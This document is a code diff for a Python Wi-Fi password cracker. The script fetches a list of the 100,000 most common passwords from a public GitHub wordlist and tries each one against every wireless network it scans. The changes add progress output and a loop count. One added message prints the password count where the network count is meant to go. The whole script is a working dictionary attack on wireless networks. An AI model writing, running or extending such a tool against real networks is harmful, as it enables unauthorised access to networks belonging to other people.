@@ -8,16 +8,23 @@ from wifi import Cell, Scheme, exceptions
 # need `sudo` to show all networks
 if __name__ == '__main__':
 
+
+
+
 	# download most used passwords on github.com and build a dict
+	print("Fetch top 100K most used passwords on Github...")
 	url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt"
 	response = urllib2.urlopen( url )
 	txt = response.read()
 	passwords = txt.splitlines()
 
-	print(len(passwords))
-
+	# get networks and print stats
 	networks = Cell.all('wlan0')
+	nb_loops =  len(passwords)*len(networks)
+	print("{} networks founded. The programs will loop {} times!!".format( 
+		len(passwords) , nb_loops ))
 
+	# begin to loop
 	nb_test = 0
 
 	for password in passwords:
@@ -34,7 +41,7 @@ if __name__ == '__main__':
 				finally:
 					nb_test += 1
 
-				sys.stdout.write('\rtest n°{}'.format( nb_test ))
+				sys.stdout.write('\r{} / {}'.format( nb_test, nb_loops ))
 				sys.stdout.flush()
 
 	print("you are not lucky :'(")
